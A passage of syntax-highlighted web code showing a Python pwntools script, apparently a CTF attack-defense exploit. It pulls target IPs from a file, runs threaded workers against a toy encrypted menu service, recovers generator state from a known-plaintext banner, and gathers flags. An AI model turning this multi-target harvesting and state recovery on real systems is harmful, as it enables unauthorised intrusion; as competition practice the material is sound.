style="color:#999999">=</span><span style="color:#2F798A"> 16</span><br><br><span style="color:#393A34">    log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"Using </span><span style="color:#1e754f">{</span><span style="color:#393A34">max_workers</span><span style="color:#1e754f">}</span><span style="color:#B56959"> workers with task file: </span><span style="color:#1e754f">{</span><span style="color:#393A34">filename</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">    with</span><span style="color:#393A34"> ThreadPoolExecutor</span><span style="color:#2993a3">(</span><span style="color:#B07D48">max_workers</span><span style="color:#999999">=</span><span style="color:#393A34">max_workers</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> as</span><span style="color:#393A34"> executor</span><span style="color:#999999">:</span><br><span style="color:#393A34">        futures </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><br><span style="color:#393A34">            executor</span><span style="color:#999999">.</span><span style="color:#393A34">submit</span><span style="color:#1e754f">(</span><span style="color:#393A34">worker_thread</span><span style="color:#999999">,</span><span style="color:#393A34"> i</span><span style="color:#999999">,</span><span style="color:#393A34"> filename</span><span style="color:#999999">,</span><span style="color:#393A34"> flags</span><span style="color:#999999">,</span><span style="color:#393A34"> flags_lock</span><span style="color:#1e754f">)</span><br><span style="color:#1E754F">            for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#1e754f">(</span><span style="color:#393A34">max_workers</span><span style="color:#1e754f">)</span><br><span style="color:#999999">        </span><span style="color:#2993a3">]</span><br><span style="color:#1E754F">        for</span><span style="color:#393A34"> fut </span><span style="color:#1E754F">in</span><span style="color:#393A34"> as_completed</span><span style="color:#2993a3">(</span><span style="color:#393A34">futures</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            try</span><span style="color:#999999">:</span><br><span style="color:#393A34">                fut</span><span style="color:#999999">.</span><span style="color:#393A34">result</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            except</span><span style="color:#998418"> Exception</span><span style="color:#1E754F"> as</span><span style="color:#393A34"> exc</span><span style="color:#999999">:</span><br><span style="color:#393A34">                log</span><span style="color:#999999">.</span><span style="color:#393A34">failure</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"[worker thread crashed] </span><span style="color:#1e754f">{</span><span style="color:#393A34">exc</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#998418">    print</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Collected flags:</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> flag </span><span style="color:#1E754F">in</span><span style="color:#393A34"> flags</span><span style="color:#999999">:</span><br><span style="color:#998418">        print</span><span style="color:#2993a3">(</span><span style="color:#393A34">flag</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">    with</span><span style="color:#998418"> open</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">csnote_flags.txt</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">w</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> encoding</span><span style="color:#999999">=</span><span style="color:#B5695977">"</span><span style="color:#B56959">utf-8</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> as</span><span style="color:#393A34"> f</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        for</span><span style="color:#393A34"> flag </span><span style="color:#1E754F">in</span><span style="color:#393A34"> flags</span><span style="color:#999999">:</span><br><span style="color:#393A34">            f</span><span style="color:#999999">.</span><span style="color:#393A34">write</span><span style="color:#2993a3">(</span><span style="color:#393A34">flag </span><span style="color:#AB5959">+</span><span style="color:#B5695977"> "</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python"><span style="color:#758575DD">#!/usr/bin/env python3</span><br><span style="color:#4D9375">from</span><span style="color:#B8A965"> __future__</span><span style="color:#4D9375"> import</span><span style="color:#DBD7CAEE"> annotations</span><br><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> concurrent</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">futures </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> ThreadPoolExecutor</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> as_completed</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> threading </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> Lock</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> binascii</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> re</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> struct</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> string</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> sys</span><br><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> fcntl  </span><span style="color:#758575DD"># 用于文件锁，保证多线程/多进程安全</span><br><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">info</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">arch </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">amd64</span><span style="color:#C98A7D77">"</span><br><span style="color:#758575DD"># HOST = "39.101.70.58"</span><br><span style="color:#758575DD"># PORT = 16128</span><br><span style="color:#C99076">BINARY</span><span style="color:#666666"> =</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./somebox</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#C99076"> BINARY</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> load_ips</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">filename</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    ip_list </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#5eaab5">]</span><br><span style="color:#4D9375">    with</span><span style="color:#B8A965"> open</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">filename</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#BD976A"> encoding</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">utf-8</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        for</span><span style="color:#DBD7CAEE"> line </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            line </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> line</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">strip</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            if</span><span style="color:#CB7676"> not</span><span style="color:#DBD7CAEE"> line</span><span style="color:#666666">:</span><br><span style="color:#4D9375">                continue</span><br><span style="color:#DBD7CAEE">            parts </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> line</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">split</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            if</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">parts</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                ip</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> port </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> parts</span><br><span style="color:#4D9375">                try</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                    port_int </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">port</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">                except</span><span style="color:#B8A965"> ValueError</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                    log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">warning</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Skipping invalid port for </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">ip</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">port</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">                    continue</span><br><span style="color:#DBD7CAEE">                ip_list</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">ip</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> port_int</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> ip_list</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> pop_one_ip</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">filename</span><span style="color:#666666">:</span><span style="color:#B8A965"> str</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#C98A7D77">    """</span><br><span style="color:#C98A7D">    从 filename（默认 csnote_ips.txt）中「取出一行 ip port」，并把这一行从文件中删除。</span><br><span style="color:#C98A7D">    返回 (ip, port_int) 或 None（表示没有更多目标）。</span><br><span style="color:#C98A7D">    带文件锁，适合多线程 / 多进程抢任务。</span><br><span style="color:#C98A7D77">    """</span><br><span style="color:#4D9375">    try</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        with</span><span style="color:#B8A965"> open</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">filename</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">r+</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> encoding</span><span style="color:#666666">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">utf-8</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">:</span><br><span style="color:#758575DD">            # 独占锁，避免并发读写冲突</span><br><span style="color:#DBD7CAEE">            fcntl</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">flock</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">f</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> fcntl</span><span style="color:#666666">.</span><span style="color:#C99076">LOCK_EX</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">            lines </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">readlines</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD">            # 找第一行非空行</span><br><span style="color:#DBD7CAEE">            idx </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><br><span style="color:#4D9375">            while</span><span style="color:#DBD7CAEE"> idx </span><span style="color:#CB7676">&#x3C;</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">lines</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> and</span><span style="color:#CB7676"> not</span><span style="color:#DBD7CAEE"> lines</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">]</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">strip</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                idx </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span><br><br><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> idx </span><span style="color:#CB7676">></span><span style="color:#CB7676">=</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">lines</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#758575DD">                # 没有目标了</span><br><span style="color:#DBD7CAEE">                fcntl</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">flock</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">f</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> fcntl</span><span style="color:#666666">.</span><span style="color:#C99076">LOCK_UN</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">                return</span><span style="color:#4D9375"> None</span><br><br><span style="color:#DBD7CAEE">            first_line </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> lines</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">]</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">strip</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD">            # 删除这一行，其他行保持原样</span><br><span style="color:#DBD7CAEE">            new_lines </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> lines</span><span style="color:#5eaab5">[</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> lines</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">idx </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">:</span><span style="color:#5eaab5">]</span><br><br><span style="color:#DBD7CAEE">            f</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">seek</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            f</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">truncate</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            f</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">writelines</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">new_lines</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            f</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">flush</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">            fcntl</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">flock</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">f</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> fcntl</span><span style="color:#666666">.</span><span style="color:#C99076">LOCK_UN</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">        parts </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> first_line</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">split</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">parts</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">warning</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Skipping invalid line in </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">filename</span><span style="color:#CB7676">!r</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">first_line</span><span style="color:#CB7676">!r</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            return</span><span style="color:#4D9375"> None</span><br><br><span style="color:#DBD7CAEE">        ip</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> port_str </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> parts</span><br><span style="color:#4D9375">        try</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            port_int </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">port_str</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        except</span><span style="color:#B8A965"> ValueError</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">warning</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Skipping invalid port for </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">ip</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">port_str</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            return</span><span style="color:#4D9375"> None</span><br><br><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> ip</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> port_int</span><br><br><span style="color:#4D9375">    except</span><span style="color:#B8A965"> FileNotFoundError</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">warning</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">filename</span><span style="color:#4d9375">}</span><span style="color:#C98A7D"> not found."</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        return</span><span style="color:#4D9375"> None</span><br><span style="color:#4D9375">    except</span><span style="color:#B8A965"> Exception</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> e</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">failure</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"pop_one_ip() failed: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">e</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        return</span><span style="color:#4D9375"> None</span><br><br><br><span style="color:#758575DD"># Known plaintext banner (215 bytes, trailing space after "Your choice:")</span><br><span style="color:#C99076">BANNER_PT</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><br><span style="color:#CB7676">    b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">================= TOY ENCRYPTED SERVICE =================</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><br><span style="color:#CB7676">    b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">1) Echo back what you send</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><br><span style="color:#CB7676">    b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">2) Admin login</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><br><span style="color:#CB7676">    b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">3) MagicCode runner</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><br><span style="color:#CB7676">    b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">4) Show config</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><br><span style="color:#CB7676">    b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">5) Quit</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><br><span style="color:#CB7676">    b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><br><span style="color:#CB7676">    b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">---------------------------------------------------------</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><br><span style="color:#CB7676">    b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Your choice: </span><span style="color:#C98A7D77">"</span><br><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># ---------------------------------------------------------------------------</span><br><span style="color:#758575DD"># Bit helpers / LCG inversion</span><br><span style="color:#758575DD"># ---------------------------------------------------------------------------</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> ror64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> n</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    return</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">x </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#DBD7CAEE"> n</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">x </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#4C9A91">64</span><span style="color:#CB7676"> -</span><span style="color:#DBD7CAEE"> n</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFFFFFFFFFFFF</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> inv_xorshift</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> k</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    x </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> y</span><br><span style="color:#DBD7CAEE">    shift </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> k</span><br><span style="color:#4D9375">    while</span><span style="color:#DBD7CAEE"> shift </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 64</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        x </span><span style="color:#666666">^=</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#DBD7CAEE"> shift</span><br><span style="color:#DBD7CAEE">        shift </span><span style="color:#666666">*=</span><span style="color:#4C9A91"> 2</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> x</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> invert_complex_transform</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">v7</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    t </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> inv_xorshift</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">v7</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 16</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    t </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> inv_xorshift</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">t</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 8</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    t </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> inv_xorshift</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">t</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 4</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    t </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> inv_xorshift</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">t</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> inv_xorshift</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">t</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> recover_state_from_block</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">block_int</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    val </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ror64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">block_int</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 7</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    high_v7 </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">val </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 32</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFFFF</span><br><span style="color:#DBD7CAEE">    low_v7 </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">val </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFFFFFF</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> ^</span><span style="color:#DBD7CAEE"> high_v7</span><br><span style="color:#DBD7CAEE">    v7 </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">high_v7 </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 32</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#DBD7CAEE"> low_v7</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> invert_complex_transform</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">v7</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> count_trailing_zeros</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        return</span><span style="color:#4C9A91"> 64</span><br><span style="color:#4D9375">    return</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">x </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> -</span><span style="color:#DBD7CAEE">x</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">bit_length</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 1</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> modinv</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">a</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> m</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#CB7676">    def</span><span style="color:#80A665"> egcd</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> y</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> x </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            return</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        g</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> p</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> q </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> egcd</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">y </span><span style="color:#CB7676">%</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> x</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        return</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">g</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> q </span><span style="color:#CB7676">-</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">y 